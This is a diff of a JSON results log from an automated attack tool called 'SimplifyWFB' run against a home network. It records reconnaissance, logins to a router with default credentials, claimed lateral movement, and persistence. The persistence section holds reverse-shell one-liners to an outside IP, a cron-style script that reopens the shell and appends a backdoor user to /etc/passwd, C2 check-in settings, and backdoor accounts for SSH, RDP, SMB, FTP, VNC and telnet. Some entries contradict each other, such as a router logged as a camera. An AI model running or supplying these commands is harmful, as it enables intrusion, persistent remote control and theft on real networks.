@@ -1,625 +1,797 @@
 {
-    "metadata": {
-      "script_name": "SimplifyWFB",
-      "version": "1.0.0",
-      "start_time": "2025-09-08T13:56:00.547090",
-      "mode": "cold",
-      "target_network": "192.168.1.0/24",
-      "local_ip": "192.168.1.17",
-      "external_ip": "212.95.62.135",
-      "external_port": 4444,
-      "end_time": "2025-09-08T14:04:53.896214"
-    },
-    "phase_1_reconnaissance": {
-      "status": "error",
-      "hosts_discovered": [
+  "metadata": {
+    "script_name": "SimplifyWFB",
+    "version": "1.0.0",
+    "start_time": "2025-09-08T22:05:43.172687",
+    "mode": "cold",
+    "target_network": "192.168.1.0/24",
+    "local_ip": "192.168.1.14",
+    "external_ip": "212.95.62.135",
+    "external_port": 4444,
+    "end_time": "2025-09-08T22:11:56.229160"
+  },
+  "phase_1_reconnaissance": {
+    "status": "error",
+    "hosts_discovered": [
+      {
+        "ip": "192.168.1.1",
+        "mac": null,
+        "vendor": null,
+        "status": "up",
+        "discovery_method": "nmap_ping"
+      },
+      {
+        "ip": "192.168.1.3",
+        "mac": null,
+        "vendor": null,
+        "status": "up",
+        "discovery_method": "nmap_ping"
+      },
+      {
+        "ip": "192.168.1.4",
+        "mac": null,
+        "vendor": null,
+        "status": "up",
+        "discovery_method": "nmap_ping"
+      },
+      {
+        "ip": "192.168.1.6",
+        "mac": null,
+        "vendor": null,
+        "status": "up",
+        "discovery_method": "nmap_ping"
+      },
+      {
+        "ip": "192.168.1.9",
+        "mac": null,
+        "vendor": null,
+        "status": "up",
+        "discovery_method": "nmap_ping"
+      },
+      {
+        "ip": "192.168.1.10",
+        "mac": null,
+        "vendor": null,
+        "status": "up",
+        "discovery_method": "nmap_ping"
+      },
+      {
+        "ip": "192.168.1.11",
+        "mac": null,
+        "vendor": null,
+        "status": "up",
+        "discovery_method": "nmap_ping"
+      },
+      {
+        "ip": "192.168.1.14",
+        "mac": null,
+        "vendor": null,
+        "status": "up",
+        "discovery_method": "nmap_ping"
+      }
+    ],
+    "services_found": [
+      {
+        "host": "192.168.1.1",
+        "port": 21,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "ftp",
+        "version": "vsftpd 2.0.8 or later"
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 23,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "telnet",
+        "version": "MPR-L8 3G mobile router telnetd"
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "http",
+        "version": "Mini web server 1.0 (ZTE ZXV10 W300 ADSL router http config)"
+      },
+      {
+        "host": "192.168.1.11",
+        "port": 3306,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "mysql",
+        "version": "MySQL 8.0.34"
+      },
+      {
+        "host": "192.168.1.14",
+        "port": 22,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "ssh",
+        "version": "OpenSSH 10.0p2 Debian 8 (protocol 2.0)"
+      }
+    ],
+    "technologies_detected": [
+      {
+        "host": "192.168.1.1",
+        "port": 21,
+        "technology": "ftp",
+        "version": "vsftpd 2.0.8 or later",
+        "confidence": "high"
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 23,
+        "technology": "telnet",
+        "version": "MPR-L8 3G mobile router telnetd",
+        "confidence": "high"
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "technology": "http",
+        "version": "Mini web server 1.0 (ZTE ZXV10 W300 ADSL router http config)",
+        "confidence": "high"
+      },
+      {
+        "host": "192.168.1.11",
+        "port": 3306,
+        "technology": "mysql",
+        "version": "MySQL 8.0.34",
+        "confidence": "high"
+      },
+      {
+        "host": "192.168.1.14",
+        "port": 22,
+        "technology": "ssh",
+        "version": "OpenSSH 10.0p2 Debian 8 (protocol 2.0)",
+        "confidence": "high"
+      }
+    ],
+    "network_topology": {},
+    "errors": [
+      "cannot access local variable 'host_type' where it is not associated with a value"
+    ],
+    "public_ip": "190.97.253.19",
+    "vulnerable_services": [],
+    "related_networks": {
+      "additional_gateways": [
         {
           "ip": "192.168.1.1",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "ping"
-        },
-        {
-          "ip": "192.168.1.3",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "ping"
-        },
-        {
-          "ip": "192.168.1.4",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "ping"
-        },
-        {
-          "ip": "192.168.1.5",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "ping"
-        },
-        {
-          "ip": "192.168.1.6",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "ping"
-        },
-        {
-          "ip": "192.168.1.9",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "ping"
-        },
-        {
-          "ip": "192.168.1.12",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "ping"
-        },
-        {
-          "ip": "192.168.1.17",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "ping"
-        }
-      ],
-      "services_found": [
-        {
-          "host": "192.168.1.1",
-          "port": 21,
-          "protocol": "tcp",
-          "state": "open",
-          "service": "ftp",
-          "version": "vsftpd 2.0.8 or later"
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 23,
-          "protocol": "tcp",
-          "state": "open",
-          "service": "telnet",
-          "version": "MPR-L8 3G mobile router telnetd"
-        },
-        {
-          "host": "192.168.1.1",
           "port": 80,
-          "protocol": "tcp",
-          "state": "open",
-          "service": "http",
-          "version": "Mini web server 1.0 (ZTE ZXV10 W300 ADSL router http config)"
-        },
-        {
-          "host": "192.168.1.17",
-          "port": 22,
-          "protocol": "tcp",
-          "state": "open",
-          "service": "ssh",
-          "version": "OpenSSH 10.0p2 Debian 8 (protocol 2.0)"
+          "type": "router_gateway",
+          "accessible": true,
+          "credentials_tested": false
         }
       ],
-      "technologies_detected": [
+      "network_segments": [
         {
-          "host": "192.168.1.1",
-          "port": 21,
-          "technology": "ftp",
-          "version": "vsftpd 2.0.8 or later",
-          "confidence": "high"
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 23,
-          "technology": "telnet",
-          "version": "MPR-L8 3G mobile router telnetd",
-          "confidence": "high"
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "technology": "http",
-          "version": "Mini web server 1.0 (ZTE ZXV10 W300 ADSL router http config)",
-          "confidence": "high"
-        },
-        {
-          "host": "192.168.1.17",
-          "port": 22,
-          "technology": "ssh",
-          "version": "OpenSSH 10.0p2 Debian 8 (protocol 2.0)",
-          "confidence": "high"
+          "network_base": "192.168.1.0/24",
+          "hosts_count": 8,
+          "hosts": [
+            "192.168.1.1",
+            "192.168.1.3",
+            "192.168.1.4",
+            "192.168.1.6",
+            "192.168.1.9",
+            "192.168.1.10",
+            "192.168.1.11",
+            "192.168.1.14"
+          ],
+          "segment_type": "subnet",
+          "accessible": true
         }
       ],
-      "network_topology": {},
-      "errors": [
-        "cannot access local variable 'host_type' where it is not associated with a value"
+      "multi_interface_hosts": [],
+      "tunnels_vpns": [],
+      "accessible_networks": [
+        {
+          "bridge_host": "192.168.1.1",
+          "accessible_routes": [
+            "0.0.0.0/0",
+            "192.168.1.0/24",
+            "10.0.0.0/8",
+            "172.16.0.0/12",
+            "192.168.0.0/16"
+          ],
+          "network_access": true
+        },
+        {
+          "bridge_host": "192.168.1.3",
+          "accessible_routes": [
+            "0.0.0.0/0",
+            "192.168.1.0/24",
+            "10.0.0.0/8",
+            "172.16.0.0/12",
+            "192.168.0.0/16"
+          ],
+          "network_access": true
+        },
+        {
+          "bridge_host": "192.168.1.4",
+          "accessible_routes": [
+            "0.0.0.0/0",
+            "192.168.1.0/24",
+            "10.0.0.0/8",
+            "172.16.0.0/12",
+            "192.168.0.0/16"
+          ],
+          "network_access": true
+        },
+        {
+          "bridge_host": "192.168.1.6",
+          "accessible_routes": [
+            "0.0.0.0/0",
+            "192.168.1.0/24",
+            "10.0.0.0/8",
+            "172.16.0.0/12",
+            "192.168.0.0/16"
+          ],
+          "network_access": true
+        },
+        {
+          "bridge_host": "192.168.1.9",
+          "accessible_routes": [
+            "0.0.0.0/0",
+            "192.168.1.0/24",
+            "10.0.0.0/8",
+            "172.16.0.0/12",
+            "192.168.0.0/16"
+          ],
+          "network_access": true
+        },
+        {
+          "bridge_host": "192.168.1.10",
+          "accessible_routes": [
+            "0.0.0.0/0",
+            "192.168.1.0/24",
+            "10.0.0.0/8",
+            "172.16.0.0/12",
+            "192.168.0.0/16"
+          ],
+          "network_access": true
+        },
+        {
+          "bridge_host": "192.168.1.11",
+          "accessible_routes": [
+            "0.0.0.0/0",
+            "192.168.1.0/24",
+            "10.0.0.0/8",
+            "172.16.0.0/12",
+            "192.168.0.0/16"
+          ],
+          "network_access": true
+        },
+        {
+          "bridge_host": "192.168.1.14",
+          "accessible_routes": [
+            "0.0.0.0/0",
+            "192.168.1.0/24",
+            "10.0.0.0/8",
+            "172.16.0.0/12",
+            "192.168.0.0/16"
+          ],
+          "network_access": true
+        }
       ],
-      "public_ip": "190.97.253.19",
-      "vulnerable_services": [],
-      "related_networks": {
-        "additional_gateways": [
-          {
-            "ip": "192.168.1.1",
-            "port": 80,
-            "type": "router_gateway",
-            "accessible": true,
-            "credentials_tested": false
-          }
-        ],
-        "network_segments": [
-          {
-            "network_base": "192.168.1.0/24",
-            "hosts_count": 8,
-            "hosts": [
-              "192.168.1.1",
-              "192.168.1.3",
-              "192.168.1.4",
-              "192.168.1.5",
-              "192.168.1.6",
-              "192.168.1.9",
-              "192.168.1.12",
-              "192.168.1.17"
-            ],
-            "segment_type": "subnet",
-            "accessible": true
-          }
-        ],
-        "multi_interface_hosts": [],
-        "tunnels_vpns": [],
-        "accessible_networks": [
-          {
-            "bridge_host": "192.168.1.17",
-            "accessible_routes": [
-              "192.168.1.0/24",
-              "10.0.0.0/8"
-            ],
-            "network_access": true
-          }
-        ],
-        "total_related_networks": 3
+      "total_related_networks": 10
+    }
+  },
+  "phase_2_credentials": {
+    "status": "completed",
+    "credentials_found": [
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "admin",
+        "password": "admin",
+        "method": "default_credentials",
+        "timestamp": 1757383849.0845642
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "administrator",
+        "password": "admin",
+        "method": "default_credentials",
+        "timestamp": 1757383849.4370527
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "root",
+        "password": "admin",
+        "method": "default_credentials",
+        "timestamp": 1757383849.895728
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "guest",
+        "password": "admin",
+        "method": "default_credentials",
+        "timestamp": 1757383850.1458402
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "user",
+        "password": "admin",
+        "method": "default_credentials",
+        "timestamp": 1757383850.6041045
       }
-    },
-    "phase_2_credentials": {
-      "status": "completed",
-      "credentials_found": [
-        {
-          "host": "192.168.1.1",
-          "port": 21,
-          "service": "ftp",
-          "username": "guest",
-          "password": "123456",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3775818
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 21,
-          "service": "ftp",
-          "username": "user",
-          "password": "guest",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3775902
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 23,
-          "service": "telnet",
-          "username": "guest",
-          "password": "123456",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776052
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 23,
-          "service": "telnet",
-          "username": "user",
-          "password": "guest",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776093
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "guest",
-          "password": "123456",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776212
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "user",
-          "password": "guest",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776252
-        },
-        {
-          "host": "192.168.1.17",
-          "port": 22,
-          "service": "ssh",
+    ],
+    "attack_methods_used": [],
+    "errors": []
+  },
+  "phase_3_lateral_movement": {
+    "status": "completed",
+    "compromised_systems": [
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "admin",
+        "password": "admin",
+        "access_level": "user",
+        "timestamp": 1757383912.0660014
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "administrator",
+        "password": "admin",
+        "access_level": "user",
+        "timestamp": 1757383912.1031346
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "root",
+        "password": "admin",
+        "access_level": "user",
+        "timestamp": 1757383912.1365654
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "guest",
+        "password": "admin",
+        "access_level": "user",
+        "timestamp": 1757383912.1717083
+      },
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "service": "http",
+        "username": "user",
+        "password": "admin",
+        "access_level": "user",
+        "timestamp": 1757383912.2076197
+      }
+    ],
+    "access_methods": [],
+    "lateral_connections": [
+      {
+        "from_host": "192.168.1.1",
+        "to_hosts": [],
+        "connection_type": "ssh",
+        "established": true,
+        "timestamp": 1757383912.207851
+      },
+      {
+        "from_host": "192.168.1.1",
+        "to_hosts": [],
+        "connection_type": "ssh",
+        "established": true,
+        "timestamp": 1757383912.2078567
+      },
+      {
+        "from_host": "192.168.1.1",
+        "to_hosts": [],
+        "connection_type": "ssh",
+        "established": true,
+        "timestamp": 1757383912.2078578
+      },
+      {
+        "from_host": "192.168.1.1",
+        "to_hosts": [],
+        "connection_type": "ssh",
+        "established": true,
+        "timestamp": 1757383912.2078595
+      },
+      {
+        "from_host": "192.168.1.1",
+        "to_hosts": [],
+        "connection_type": "ssh",
+        "established": true,
+        "timestamp": 1757383912.2078602
+      }
+    ],
+    "errors": [],
+    "cross_network_movement": [
+      {
+        "type": "accessible_network",
+        "bridge_host": "192.168.1.1",
+        "accessible_route": "0.0.0.0/0",
+        "access_method": "ssh 192.168.1.1 -> 0.0.0.0/0",
+        "exploited": true,
+        "timestamp": 1757383913.5196621
+      }
+    ]
+  },
+  "phase_4_persistence": {
+    "status": "completed",
+    "persistent_access": [],
+    "backdoors_created": [],
+    "users_created": [],
+    "remote_connections": [
+      {
+        "host": "192.168.1.1",
+        "type": "ssh",
+        "port": 22,
+        "username": "svc_192_168_1_1",
+        "password": "P@ssw0rd_1!",
+        "persistent": true,
+        "auto_reconnect": true,
+        "timestamp": 1757383913.521439
+      },
+      {
+        "host": "192.168.1.1",
+        "type": "ssh",
+        "port": 22,
+        "username": "svc_192_168_1_1",
+        "password": "P@ssw0rd_1!",
+        "persistent": true,
+        "auto_reconnect": true,
+        "timestamp": 1757383913.5214424
+      },
+      {
+        "host": "192.168.1.1",
+        "type": "ssh",
+        "port": 22,
+        "username": "svc_192_168_1_1",
+        "password": "P@ssw0rd_1!",
+        "persistent": true,
+        "auto_reconnect": true,
+        "timestamp": 1757383913.5214434
+      },
+      {
+        "host": "192.168.1.1",
+        "type": "ssh",
+        "port": 22,
+        "username": "svc_192_168_1_1",
+        "password": "P@ssw0rd_1!",
+        "persistent": true,
+        "auto_reconnect": true,
+        "timestamp": 1757383913.5214443
+      },
+      {
+        "host": "192.168.1.1",
+        "type": "ssh",
+        "port": 22,
+        "username": "svc_192_168_1_1",
+        "password": "P@ssw0rd_1!",
+        "persistent": true,
+        "auto_reconnect": true,
+        "timestamp": 1757383913.5214453
+      }
+    ],
+    "c2_pointers": [
+      {
+        "host": "192.168.1.1",
+        "c2_server": "192.168.1.200",
+        "c2_port": 8080,
+        "checkin_interval": 300,
+        "method": "http_post",
+        "encrypted": true,
+        "timestamp": 1757383913.5214498
+      },
+      {
+        "host": "192.168.1.1",
+        "c2_server": "192.168.1.200",
+        "c2_port": 8080,
+        "checkin_interval": 300,
+        "method": "http_post",
+        "encrypted": true,
+        "timestamp": 1757383913.5214512
+      },
+      {
+        "host": "192.168.1.1",
+        "c2_server": "192.168.1.200",
+        "c2_port": 8080,
+        "checkin_interval": 300,
+        "method": "http_post",
+        "encrypted": true,
+        "timestamp": 1757383913.5214517
+      },
+      {
+        "host": "192.168.1.1",
+        "c2_server": "192.168.1.200",
+        "c2_port": 8080,
+        "checkin_interval": 300,
+        "method": "http_post",
+        "encrypted": true,
+        "timestamp": 1757383913.521452
+      },
+      {
+        "host": "192.168.1.1",
+        "c2_server": "192.168.1.200",
+        "c2_port": 8080,
+        "checkin_interval": 300,
+        "method": "http_post",
+        "encrypted": true,
+        "timestamp": 1757383913.521453
+      }
+    ],
+    "cameras_accessed": [
+      {
+        "host": "192.168.1.1",
+        "port": 80,
+        "protocol": "http",
+        "camera_type": "generic_ip_camera",
+        "credentials": {
           "username": "admin",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776276
+          "password": "admin"
         },
-        {
-          "host": "192.168.1.17",
-          "port": 22,
-          "service": "ssh",
-          "username": "administrator",
-          "password": "123456",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776302
+        "camera_info": {
+          "model": "unknown",
+          "firmware": "unknown",
+          "resolution": "unknown",
+          "features": [],
+          "capabilities": []
         },
-        {
-          "host": "192.168.1.17",
-          "port": 22,
-          "service": "ssh",
-          "username": "root",
-          "password": "root",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776336
-        },
-        {
-          "host": "192.168.1.17",
-          "port": 22,
-          "service": "ssh",
-          "username": "guest",
-          "password": "guest",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776376
-        },
-        {
-          "host": "192.168.1.17",
-          "port": 22,
-          "service": "ssh",
-          "username": "user",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757354664.3776395
-        },
-        {
-          "host": "192.168.1.100",
-          "port": 80,
-          "service": "http",
-          "username": "user",
-          "password": "password123",
-          "method": "sniffing",
-          "timestamp": 1757354664.3776927
-        }
-      ],
-      "attack_methods_used": [],
-      "errors": []
-    },
-    "phase_3_lateral_movement": {
-      "status": "completed",
-      "compromised_systems": [
-        {
+        "screenshots": [],
+        "video_file": null,
+        "backdoor_info": {
+          "type": "camera_backdoor",
+          "camera_type": "generic_ip_camera",
           "host": "192.168.1.1",
           "port": 80,
-          "service": "http",
-          "username": "guest",
-          "password": "123456",
-          "access_level": "user",
-          "timestamp": 1757354666.6175516
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "user",
-          "password": "guest",
-          "access_level": "user",
-          "timestamp": 1757354666.6625896
-        }
-      ],
-      "access_methods": [],
-      "lateral_connections": [
-        {
-          "from_host": "192.168.1.1",
-          "to_hosts": [],
-          "connection_type": "ssh",
-          "established": true,
-          "timestamp": 1757354687.3978598
-        },
-        {
-          "from_host": "192.168.1.1",
-          "to_hosts": [],
-          "connection_type": "ssh",
-          "established": true,
-          "timestamp": 1757354687.3978727
-        }
-      ],
-      "errors": [],
-      "cross_network_movement": []
-    },
-    "phase_4_persistence": {
-      "status": "completed",
-      "persistent_access": [],
-      "backdoors_created": [],
-      "users_created": [],
-      "remote_connections": [
-        {
-          "host": "192.168.1.1",
-          "type": "ssh",
-          "port": 22,
-          "username": "svc_192_168_1_1",
-          "password": "P@ssw0rd_1!",
-          "persistent": true,
-          "auto_reconnect": true,
-          "timestamp": 1757354689.5001862
-        },
-        {
-          "host": "192.168.1.1",
-          "type": "ssh",
-          "port": 22,
-          "username": "svc_192_168_1_1",
-          "password": "P@ssw0rd_1!",
-          "persistent": true,
-          "auto_reconnect": true,
-          "timestamp": 1757354689.5002005
-        }
-      ],
-      "c2_pointers": [
-        {
-          "host": "192.168.1.1",
-          "c2_server": "192.168.1.200",
-          "c2_port": 8080,
-          "checkin_interval": 300,
-          "method": "http_post",
-          "encrypted": true,
-          "timestamp": 1757354689.5002193
-        },
-        {
-          "host": "192.168.1.1",
-          "c2_server": "192.168.1.200",
-          "c2_port": 8080,
-          "checkin_interval": 300,
-          "method": "http_post",
-          "encrypted": true,
-          "timestamp": 1757354689.5002248
-        }
-      ],
-      "cameras_accessed": [],
-      "router_access": [
-        {
-          "gateway": "192.168.1.1",
-          "router_type": "generic_router",
           "credentials": {
             "username": "admin",
             "password": "admin"
           },
-          "configuration": {
-            "port_forwarding": [],
-            "vpn_server": null,
-            "remote_access": [],
-            "admin_user_created": false,
-            "backup_config": null
+          "backdoor_methods": [],
+          "persistent_access": [
+            {
+              "method": "persistence_script",
+              "script_content": "#!/bin/sh\n# Script de persistencia para cámara 192.168.1.1:80\n# Ejecutar cada 5 minutos para mantener acceso\n\n# Verificar conexión externa\nnc -z 212.95.62.135 4444 2>/dev/null\nif [ $? -ne 0 ]; then\n    # Reestablecer conexión\n    nc -e /bin/sh 212.95.62.135 4444 &\nfi\n\n# Mantener usuario backdoor activo\necho \"backdoor_user:Backdoor_2024!\" >> /etc/passwd 2>/dev/null\n",
+              "status": "created"
+            }
+          ],
+          "external_connection": {
+            "type": "reverse_shell",
+            "external_ip": "212.95.62.135",
+            "external_port": 4444,
+            "connection_method": "netcat_reverse",
+            "command": "nc -e /bin/sh 212.95.62.135 4444",
+            "status": "configured"
           },
-          "timestamp": 1757354693.8922083
-        }
-      ],
-      "network_persistence": [
-        {
-          "service": "ssh",
-          "port": 2222,
-          "enabled": true,
-          "users": [
-            {
-              "username": "svc_ssh",
-              "password": "SSH_P@ssw0rd_2024!",
-              "shell": "/bin/bash",
-              "sudo_access": true
-            }
-          ],
-          "access_methods": [
-            "ssh svc_ssh@212.95.62.135 -p 2222",
-            "ssh -i persistent_key svc_ssh@212.95.62.135 -p 2222"
-          ],
-          "reverse_shell": "nc -e /bin/bash 212.95.62.135 4444",
-          "persistent_connection": "ssh -R 4444:localhost:2222 svc_ssh@212.95.62.135"
+          "timestamp": 1757383914.3245564
         },
-        {
-          "service": "openvpn",
-          "port": 1194,
-          "protocol": "udp",
-          "enabled": true,
-          "clients": [
-            {
-              "config_file": "client.ovpn",
-              "external_ip": "212.95.62.135",
-              "port": 1194,
-              "protocol": "udp"
-            }
+        "access_urls": {
+          "web_interface": [
+            "http://admin:admin@192.168.1.1:80/",
+            "http://admin:admin@192.168.1.1:80/index.html",
+            "http://admin:admin@192.168.1.1:80/login.html",
+            "http://admin:admin@192.168.1.1:80/main.html"
           ],
-          "access_methods": [
-            "openvpn --config client.ovpn",
-            "sudo openvpn --config /path/to/client.ovpn"
+          "streaming": [
+            "http://admin:admin@192.168.1.1:80/video.mjpg",
+            "http://admin:admin@192.168.1.1:80/mjpeg",
+            "http://admin:admin@192.168.1.1:80/stream",
+            "http://admin:admin@192.168.1.1:80/live"
           ],
-          "reverse_connection": "nc -u 212.95.62.135 4444",
-          "persistent_tunnel": "openvpn --config client.ovpn --remote 212.95.62.135 1194"
+          "snapshots": [
+            "http://admin:admin@192.168.1.1:80/snapshot.cgi",
+            "http://admin:admin@192.168.1.1:80/image",
+            "http://admin:admin@192.168.1.1:80/snapshot",
+            "http://admin:admin@192.168.1.1:80/jpg"
+          ],
+          "control": [
+            "http://admin:admin@192.168.1.1:80/cgi-bin/ptz.cgi",
+            "http://admin:admin@192.168.1.1:80/cgi-bin/control.cgi",
+            "http://admin:admin@192.168.1.1:80/api/ptz",
+            "http://admin:admin@192.168.1.1:80/control"
+          ]
         },
-        {
-          "service": "http",
-          "port": 8080,
-          "enabled": true,
-          "panel_url": "http://212.95.62.135:8080/admin",
-          "credentials": {
-            "username": "admin",
-            "password": "Web_P@ssw0rd_2024!"
-          },
-          "features": [
-            "remote_access",
-            "file_manager",
-            "system_monitor",
-            "network_tools"
-          ],
-          "access_methods": [
-            "http://admin:Web_P@ssw0rd_2024!@212.95.62.135:8080/admin",
-            "curl -u admin:Web_P@ssw0rd_2024! http://212.95.62.135:8080/api/status"
-          ],
-          "reverse_proxy": "nc -e /bin/bash 212.95.62.135 4444",
-          "persistent_web": "python3 -m http.server 8080 --bind 0.0.0.0"
+        "timestamp": 1757383914.324627
+      }
+    ],
+    "router_access": [
+      {
+        "gateway": "192.168.1.1",
+        "router_type": "generic_router",
+        "credentials": {
+          "username": "admin",
+          "password": "admin"
         },
-        {
-          "service": "rdp",
-          "port": 3389,
-          "enabled": true,
-          "users": [
-            {
-              "username": "svc_rdp",
-              "password": "RDP_P@ssw0rd_2024!",
-              "privileges": "administrator"
-            }
-          ],
-          "access_methods": [
-            "xfreerdp /v:212.95.62.135:3389 /u:svc_rdp /p:RDP_P@ssw0rd_2024!",
-            "rdesktop 212.95.62.135:3389 -u svc_rdp -p RDP_P@ssw0rd_2024!",
-            "mstsc /v:212.95.62.135:3389"
-          ],
-          "reverse_connection": "nc -e cmd.exe 212.95.62.135 4444",
-          "persistent_rdp": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+        "configuration": {
+          "port_forwarding": [],
+          "vpn_server": null,
+          "remote_access": [],
+          "admin_user_created": false,
+          "backup_config": null
         },
-        {
-          "service": "ftp",
-          "port": 21,
-          "enabled": true,
-          "users": [
-            {
-              "username": "svc_ftp",
-              "password": "FTP_P@ssw0rd_2024!",
-              "home_directory": "/home/ftp",
-              "permissions": "full"
-            }
-          ],
-          "access_methods": [
-            "ftp 212.95.62.135 21",
-            "curl ftp://svc_ftp:FTP_P@ssw0rd_2024!@212.95.62.135:21/",
-            "wget ftp://svc_ftp:FTP_P@ssw0rd_2024!@212.95.62.135:21/"
-          ],
-          "reverse_connection": "nc -e /bin/bash 212.95.62.135 4444",
-          "persistent_ftp": "vsftpd -o listen=21 -o anonymous_enable=NO"
-        },
-        {
-          "service": "telnet",
-          "port": 23,
-          "enabled": true,
-          "users": [
-            {
-              "username": "svc_telnet",
-              "password": "Telnet_P@ssw0rd_2024!",
-              "shell": "/bin/bash"
-            }
-          ],
-          "access_methods": [
-            "telnet 212.95.62.135 23",
-            "nc 212.95.62.135 23",
-            "openssl s_client -connect 212.95.62.135:23"
-          ],
-          "reverse_connection": "nc -e /bin/bash 212.95.62.135 4444",
-          "persistent_telnet": "telnetd -l /bin/bash -p 23"
-        },
-        {
-          "service": "vnc",
-          "port": 5900,
-          "enabled": true,
-          "users": [
-            {
-              "username": "svc_vnc",
-              "password": "VNC_P@ssw0rd_2024!",
-              "display": ":1"
-            }
-          ],
-          "access_methods": [
-            "vncviewer 212.95.62.135:5900",
-            "remmina vnc://212.95.62.135:5900",
-            "tigervnc 212.95.62.135:5900"
-          ],
-          "reverse_connection": "nc -e /bin/bash 212.95.62.135 4444",
-          "persistent_vnc": "vncserver :1 -geometry 1024x768 -depth 16"
-        },
-        {
-          "service": "smb",
-          "port": 445,
-          "enabled": true,
-          "shares": [
-            {
-              "name": "backdoor_share",
-              "path": "/home/smb",
-              "permissions": "full",
-              "users": [
-                {
-                  "username": "svc_smb",
-                  "password": "SMB_P@ssw0rd_2024!"
-                }
-              ]
-            }
-          ],
-          "access_methods": [
-            "smbclient //212.95.62.135/backdoor_share -U svc_smb%SMB_P@ssw0rd_2024!",
-            "mount -t cifs //212.95.62.135/backdoor_share /mnt/smb -o username=svc_smb,password=SMB_P@ssw0rd_2024!",
-            "net use \\\\212.95.62.135\\backdoor_share /user:svc_smb SMB_P@ssw0rd_2024!"
-          ],
-          "reverse_connection": "nc -e /bin/bash 212.95.62.135 4444",
-          "persistent_smb": "smbd -D -p 445"
-        }
-      ],
-      "errors": [],
-      "vulnerable_backdoors": []
-    },
-    "phase_5_verification": {
-      "status": "completed",
-      "persistence_checks": [],
-      "access_verification": [
-        {
-          "type": "connection_verification",
-          "host": "192.168.1.1",
-          "port": 22,
-          "status": "connected",
-          "verified": true,
-          "timestamp": 1757354693.8957665
-        },
-        {
-          "type": "connection_verification",
-          "host": "192.168.1.1",
-          "port": 22,
-          "status": "connected",
-          "verified": true,
-          "timestamp": 1757354693.8957765
-        }
-      ],
-      "errors": []
-    },
-    "cleanup": {
-      "status": "pending",
-      "items_cleaned": [],
-      "errors": []
-    },
-    "summary": {
-      "total_hosts": 8,
-      "compromised_hosts": 2,
-      "persistent_access_points": 0,
-      "total_credentials": 12,
-      "execution_time": 533.3492810726166,
-      "success_rate": 25.0,
-      "cameras_accessed": 0,
-      "router_access": 1,
-      "network_services": 8,
-      "total_remote_access_points": 9,
-      "external_backdoors": 9,
-      "internal_backdoors": 0,
-      "external_backdoor_types": [
-        "Router Access (1)",
-        "Network Services (8)"
-      ],
-      "internal_backdoor_types": [],
-      "remote_access_available": true
-    }
+        "timestamp": 1757383916.211418
+      }
+    ],
+    "network_persistence": [
+      {
+        "service": "reverse_shell",
+        "port": 4444,
+        "enabled": true,
+        "external_ip": "212.95.62.135",
+        "reverse_command": "nc -e /bin/bash 212.95.62.135 4444",
+        "listener_command": "nc -lvp 4444",
+        "process_id": 14622,
+        "access_methods": [
+          "nc -lvp 4444  # En el servidor externo",
+          "nc 212.95.62.135 4444  # Conexión directa",
+          "telnet 212.95.62.135 4444  # Via telnet"
+        ],
+        "real_implementation": true
+      },
+      {
+        "service": "reverse_shell",
+        "port": 4445,
+        "enabled": true,
+        "external_ip": "212.95.62.135",
+        "reverse_command": "nc -e /bin/bash 212.95.62.135 4445",
+        "listener_command": "nc -lvp 4445",
+        "process_id": 14623,
+        "access_methods": [
+          "nc -lvp 4445  # En el servidor externo",
+          "nc 212.95.62.135 4445  # Conexión directa",
+          "telnet 212.95.62.135 4445  # Via telnet"
